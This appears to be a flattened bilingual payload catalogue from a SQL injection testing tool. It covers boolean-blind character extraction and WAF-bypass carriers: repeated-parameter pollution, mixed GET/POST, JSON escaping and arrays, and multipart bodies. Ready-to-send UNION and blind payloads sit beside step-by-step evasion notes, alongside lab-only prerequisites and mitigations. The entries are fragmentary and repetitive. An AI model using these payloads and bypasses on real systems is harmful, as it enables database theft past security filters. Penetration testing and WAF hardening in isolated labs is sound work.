' AND ASCII(SUBSTRING('PAYLOADER_MARKER',1,1))>126-- -

title.en: Extract content via per-character binary search

description.zh: 组合 MID、LEFT 与比较符或 CASE 表达式二分猜测每一位，真分支响应指示命中，循环推进即可还原完整字符串。
description.en: Combine MID/LEFT with comparisons or CASE to binary-search each character; true-branch responses reveal hits until the string is rebuilt.

attackChain.payload:
' AND (CASE WHEN (MID(database(),1,1)='a') THEN 1 ELSE 0 END)=1--
' AND LEFT(database(),1)>'a'--
' AND RIGHT(LEFT(database(),2),1)='d'--

' AND (SELECT CONV(HEX(SUBSTR('PAYLOADER_MARKER',1,1)),16,10))>96-- -

' AND ORD(MID('PAYLOADER_MARKER',1,1))>96-- -

prerequisites.zh: 仅在隔离实例确认固定 Marker 布尔盲注差分所需 DBMS、驱动、代理或解析器行为，不跨技术分支推断结果。
prerequisites.en: Confirm the DBMS, driver, proxy, or parser behavior required by Fixed-Marker Boolean Blind Differential in an isolated instance and do not infer results across technique branches.

prerequisites.zh: 准备固定 PAYLOADER_MARKER、阴性/阳性对照、最终语句或原始字节日志及短超时；真实数据和生产流量不得使用。
prerequisites.en: Prepare a fixed PAYLOADER_MARKER, negative and positive controls, final-statement or raw-byte logs, and short timeouts; do not use real data or production traffic.

analysis.zh: 固定 Marker 布尔盲注差分的阳性必须由同一 marker 的解析差分与最终后端行为共同证明；本地工具输出、普通超时、连接关闭、错误页和另一 DBMS 的成功语句均是假阳性。
analysis.en: A positive for Fixed-Marker Boolean Blind Differential requires the parsing differential and final backend behavior for the same marker. Local tool output, ordinary timeouts, connection closure, error pages, and successful statements on another DBMS are false positives.

opsecTips.zh: 出现连接错位、锁等待、生产数据、真实外连、日志或 CPU 激增、缓存污染或用户流量影响时立即停止。
opsecTips.en: Stop immediately on connection desynchronization, lock waits, production data, real egress, log or CPU spikes, cache contamination, or user-traffic impact.

opsecTips.zh: 测试后排空连接，删除 marker、临时表与抓包，清理代理/WAF/应用缓存，并确认参数化查询和正常请求均已恢复。
opsecTips.en: After testing, drain connections, remove markers, temporary tables, and captures, clear proxy, WAF, and application caches, and confirm parameterized queries and normal requests are restored.

name.zh: HTTP 重复参数载体

description.zh: 同名参数一净一污分别提交，验证后端取值顺序是否让污染值进入查询。
description.en: Submits the same parameter name twice with one clean and one tainted value, verifying whether the backend's merge order (first, last, or concatenated) differs from the WAF's view so the polluted value reaches the query.

overview.zh: 覆盖以 HTTP 重复参数（HPP）承载注入语句的载体验证：把 SQL 关键字拆分到多个同名 id 参数提交，验证服务端拼接策略对参数解析的影响。适用于探测框架与中间件参数合并行为差异的场景。
overview.en: Covers carrier verification of injection statements over HTTP parameter pollution (HPP): splitting SQL keywords across multiple same-named id parameters to probe how server-side merge strategies affect parameter parsing. Suitable for detecting behavioral differences in parameter merging across frameworks and middleware.

vulnerability.zh: 根因是不同组件对同名参数的合并策略不一致（取首、取末或拼接），WAF 检查的参数视图与应用实际使用的视图可能不同；拆分后的关键字在服务端重组后仍进入 SQL 拼接。
vulnerability.en: The root cause is inconsistent merge strategies for same-named parameters across components (first-wins, last-wins, or concatenation): the parameter view inspected by the WAF may differ from the one the application actually uses, and split keywords rejoin into SQL concatenation server-side.

exploitation.zh: 使用第 1 步命令把 SQL 关键字拆分到多个同名 id 参数提交；服务端按其拼接策略重组后执行并出现响应差异即确认 HPP 载体对参数解析的影响。先以单参数完整载荷建立对照，再逐种拆分方式测试平台的取值策略。
exploitation.en: Use the step 1 command to split SQL keywords across multiple same-named id parameters; the server reassembling per its merge strategy and executing with response differences confirms the HPP carrier's effect on parameter parsing. Start with a single-parameter full payload as a control, then test each split pattern to map the platform's merge behavior.

mitigation.en: Unify the merge strategy for same-named parameters at the application entry (e.g., first-wins) and reject duplicates, aligning WAF and application parameter views; after the fix, split payloads must be rejected or handled identically to complete payloads with no view divergence.

title.en: Split the statement across repeated parameters

description.zh: 把注入语句按段拆进多个同名参数提交，单个参数内容均不构成完整攻击特征，逐值检测难以命中任何一段载荷。
description.en: Break the statement into several same-name parameters; no single value carries a complete signature to match.

title.zh: 利用服务端取值差异重组

description.zh: 服务端对重复参数按末值或拼接方式取值，片段被重组为完整 SQL 执行，注入语义在数据库侧恢复生效命中。
description.en: The server resolves duplicates by last-value or concatenation, reassembling fragments into a full statement that executes.

title.zh: 观察响应确认语句重组生效

description.zh: 以报错或联合查询回显观察重组语句是否生效，响应出现注入特征即确认该载体可用，换任意载荷继续攻击推进。
description.en: Watch for error or UNION echoes proving the reassembled query ran; any payload can now ride this carrier.

title.zh: 参数名大小写与注释插入

description.zh: 绕过对同参数名重复+UNION 特征的组合检测：参数名大小写不一致并给值加注释分词；后端取最后一个/拼接值注入生效即成功。
description.en: Vary parameter-name case and comment-split values to defeat duplicate-param plus UNION signatures; effective injection via the backend-chosen value confirms success.

title.zh: GET 与 POST 混合传参

wafBypass.command:
POST /?id=1 HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded

id=' UNION&id=SELECT&id=1,2,3--

description.zh: 绕过只解析查询串或只解析体的单侧规则：注入拆到 POST 体与 GET 串两侧；服务端合并后注入成立即成功。
description.en: Split the injection across the query string and POST body to bypass single-side parsing; an effective merged injection confirms success.

description.zh: 绕过对 id= 直接赋值的键名匹配：用数组下标形态传值，后端 implode 后注入；报错或回显异常即成功。
description.en: Use array-subscript naming to bypass plain key matching, relying on backend imploding; an error or anomalous echo confirms success.

title.zh: HPP 拆分 SQL 关键字

description.zh: 把 SQL 关键字拆分到多个同名 id 参数提交；服务端按其拼接策略重组后执行，响应差异即确认 HPP 载体对参数解析的影响。
description.en: Split SQL keywords across multiple same-named id parameters; the server reassembling per its concatenation strategy and the resulting response difference confirm how HPP affects parameter parsing.

name.zh: JSON SQL Marker 载体

description.zh: 在 JSON 请求体的字符串字段提交 SQL Marker，验证 API 是否把 JSON 值直接拼入数据库查询。
description.en: Submits the SQL marker in JSON body string fields, verifying the API concatenates deserialized JSON values into queries while detection matches only query-string-shaped keywords and JSON escape forms evade literal matching.

overview.zh: 覆盖以 JSON 字段值承载 SQL 注入语句的载体验证：注入语句放入 JSON 字段值提交，服务端反序列化后进入 SQL 拼接。适用于 REST API 等以 JSON 为主传输形态的注入面评估场景。
overview.en: Covers carrier verification of SQL injection statements over JSON field values: statements placed in JSON field values reach SQL concatenation after server-side deserialization. Suitable for assessing injection surfaces of REST APIs and other JSON-primary transports.

vulnerability.zh: 根因是 JSON 反序列化后的字段值与其他参数同样进入 SQL 拼接，检测层可能只匹配查询串形态的关键字；JSON 的转义形态同时可帮助绕过字面匹配。
vulnerability.en: The root cause is deserialized JSON field values reaching SQL concatenation like any other parameter while detection may match only query-string-shaped keywords; JSON escaping additionally helps defeat literal matching.

exploitation.zh: 使用第 1 步命令把注入语句放入 JSON 字段值提交；服务端反序列化后进入 SQL 拼接并出现响应差异即确认 JSON 载体可达注入层。先以合法 JSON 建立对照基线，再逐字段替换布尔、报错与 UNION 载荷验证；记录字段路径与嵌套层级，确认反序列化行为稳定可复现。
exploitation.en: Use the step 1 command to place injection statements in JSON field values; deserialization feeding them into SQL concatenation with response differences confirms the JSON carrier reaches the injection layer. Baseline with legitimate JSON first, then substitute boolean, error-based, and UNION payloads field by field, recording field paths and nesting depth to confirm stable, reproducible deserialization.

mitigation.en: Process JSON fields through DTO type constraints and parameterization, with detection inspecting parsed JSON semantics; after the fix, injected field values must error or show no response difference, and encoding shapes must not affect handling.

description.zh: 接口收 JSON 时把注入写进对应字段值提交，请求类型变为 JSON 格式，载荷随结构化数据进入后端处理链路。
description.en: For JSON APIs, place the injection in the field value and post as application/json so the payload rides structured data inward.

title.zh: 利用解析位置差异绕过

description.zh: 部分规则仅检查表单与查询参数，JSON 体内容不在覆盖范围，语句顺利进入解析后的 SQL 拼接并执行生效。
description.en: Rules covering only form or query parameters skip JSON bodies, so the statement reaches the SQL builder and executes.

title.en: Confirm the channel via error echo

description.zh: 提交带单引号的语句观察报错与回显，数据库特征错误出现即通路成立，切换联合查询或盲注载荷继续提取数据。
description.en: Submit quote-bearing statements and watch for database-specific errors; their appearance proves the channel for UNION or blind follow-ups.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 仅在隔离实例确认JSON SQL Marker 载体所需 DBMS、驱动、代理或解析器行为，不跨技术分支推断结果。
prerequisites.en: Confirm the DBMS, driver, proxy, or parser behavior required by JSON SQL Marker Carrier in an isolated instance and do not infer results across technique branches.

prerequisites.zh: 准备固定 PAYLOADER_MARKER、阴性/阳性对照、最终语句或原始字节日志及短超时；真实数据和生产流量不得使用。
prerequisites.en: Prepare a fixed PAYLOADER_MARKER, negative and positive controls, final-statement or raw-byte logs, and short timeouts; do not use real data or production traffic.

analysis.zh: JSON SQL Marker 载体的阳性必须由同一 marker 的解析差分与最终后端行为共同证明；本地工具输出、普通超时、连接关闭、错误页和另一 DBMS 的成功语句均是假阳性。
analysis.en: A positive for JSON SQL Marker Carrier requires the parsing differential and final backend behavior for the same marker. Local tool output, ordinary timeouts, connection closure, error pages, and successful statements on another DBMS are false positives.

opsecTips.zh: 出现连接错位、锁等待、生产数据、真实外连、日志或 CPU 激增、缓存污染或用户流量影响时立即停止。
opsecTips.en: Stop immediately on connection desynchronization, lock waits, production data, real egress, log or CPU spikes, cache contamination, or user-traffic impact.

opsecTips.zh: 测试后排空连接，删除 marker、临时表与抓包，清理代理/WAF/应用缓存，并确认参数化查询和正常请求均已恢复。
opsecTips.en: After testing, drain connections, remove markers, temporary tables, and captures, clear proxy, WAF, and application caches, and confirm parameterized queries and normal requests are restored.

description.zh: 绕过对明文引号元字符的 JSON 体扫描：引号以 \u0027 转义，应用解码后注入；报错或回显异常即成功。
description.en: Escape the quote as \u0027 so it survives JSON body scanning and decodes at the application; an error or anomalous echo confirms success.

description.zh: 绕过对字符串标量值的类型校验：用数组包裹注入串，后端字符串化后拼入查询；注入生效即成功。
description.en: Wrap the payload in an array to pass scalar-type checks, stringified on the backend before query assembly; an effective injection confirms success.

description.zh: 绕过对单字段整串特征的检测：把语句拆到多个业务字段，依赖后端 ORDER BY 拼接；合成语句执行即成功。
description.en: Distribute the statement across multiple business fields relying on backend ORDER BY assembly; the composed statement executing confirms success.

title.zh: JSON 字段承载注入语句
title.en: JSON SQL Marker Carrier Primary Validation

description.zh: 把注入语句放入 JSON 字段值提交；服务端反序列化后进入 SQL 拼接并出现响应差异即确认 JSON 载体可达注入层。
description.en: Place the injection statement inside a JSON field value; the deserialized value entering SQL concatenation with a response difference confirms the JSON carrier reaches the injection layer.

name.zh: Multipart SQL Marker 载体

description.zh: 把 SQL Marker 放入 multipart 文件名字段提交，验证解析链是否对 multipart 部件内容做注入检查。
description.en: Places the SQL marker inside a multipart filename field, verifying whether the parsing chain inspects multipart part values for injection or only checks file types, leaving the field as a neglected injection channel.

overview.zh: 覆盖以 multipart 表单字段承载 SQL 注入语句的载体验证：注入语句放入 multipart 字段值，服务端解析后进入 SQL 拼接。适用于文件上传等 multipart 接口的参数注入面评估场景。
overview.en: Covers carrier verification of SQL injection statements over multipart form fields: statements placed in multipart field values reach SQL concatenation after server-side parsing. Suitable for assessing the parameter injection surface of multipart endpoints such as file uploads.

vulnerability.zh: 根因是 multipart 字段值经服务端解析后与其他参数同样进入 SQL 拼接，而检测层可能只扫描 URL/JSON 参数或仅做文件类型检查；字段值因此成为被忽视的注入通道。
vulnerability.en: The root cause is multipart field values reaching SQL concatenation like any other parameter after server-side parsing, while detection may only scan URL/JSON parameters or check file types; field values thus become an overlooked injection channel.

exploitation.zh: 使用第 1 步命令把注入语句放入 multipart 表单字段发送；服务端解析字段值进入 SQL 拼接并出现响应差异即确认 multipart 载体可达注入层。先以合法值建立对照基线，再把字段值替换为布尔与 UNION 载荷逐个验证；同时记录字段名与 Content-Type，便于复现与回归。
exploitation.en: Use the step 1 command to place injection statements in multipart form fields; server-side parsing feeding values into SQL concatenation with response differences confirms the multipart carrier reaches the injection layer. Baseline with legitimate values first, then substitute boolean and UNION payloads field by field, recording field names and Content-Type for reproducibility and regression.

mitigation.en: Parameterize multipart field values like any other parameter and cover the full multipart body in detection; after the fix, injected field values must error or show no response difference, with file-content checks separated from field checks.

title.zh: 构造 multipart 表单载体

description.zh: 按边界符组装完整的表单报文内容，把注入语句写入目标字段值中，建立起完整可直接发送的分块载体请求模板。
description.en: Assemble a boundary-delimited multipart body carrying the injection in the id field as a ready-to-send template.

attackChain.payload:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="id"

1 UNION SELECT 1,2,3--
------WebKitFormBoundary--

description.zh: 部分检测只解析简单表单请求体，分块字段内容不在扫描范围之内，语句完整进入后端查询执行，绕过由此成立。
description.en: Inspectors that only parse urlencoded bodies skip multipart fields, letting the intact statement reach and run in the backend query.

attackChain.payload:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="id"

1 UNION SELECT 1,2,3--
------WebKitFormBoundary--

description.zh: 观察联合查询回显或数据库报错信息是否出现，语句生效即确认载体可用，后续提取载荷均经该分块通道投递执行。
description.en: Watch for UNION echoes or SQL errors; once fired, the carrier is proven and further payloads ride the multipart channel.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.en: Confirm the DBMS, driver, proxy, or parser behavior required by Multipart SQL Marker Carrier in an isolated instance and do not infer results across technique branches.
